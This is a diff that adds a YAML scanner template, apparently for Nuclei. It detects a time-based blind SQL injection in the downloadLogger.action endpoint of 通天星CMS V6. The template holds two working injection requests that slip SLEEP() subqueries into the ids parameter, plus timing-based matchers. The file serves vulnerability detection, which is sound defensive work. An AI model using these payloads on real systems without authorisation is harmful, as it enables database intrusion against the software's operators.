@@ -1,0 +1,26 @@
+id: g-sky-downloadlogger-action-cmsv6-sqli
+info:
+  name: "通天星CMS V6 downloadLogger.action SQL 注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 通天星CMS
+
+http:
+  - raw:
+      - |
+        GET /run_stop/delete.do;downloadLogger.action?ids=1)+AND+(SELECT+5394+FROM+(SELECT(SLEEP(5)))tdpw)--+&loadAll=1 HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET /run_stop/delete.do;downloadLogger.action?ids=1)+AND+(SELECT+5394+FROM+(SELECT(SLEEP(8)))tdpw)--+&loadAll=1 HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "result\":0,\"message\":\"OK\""
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
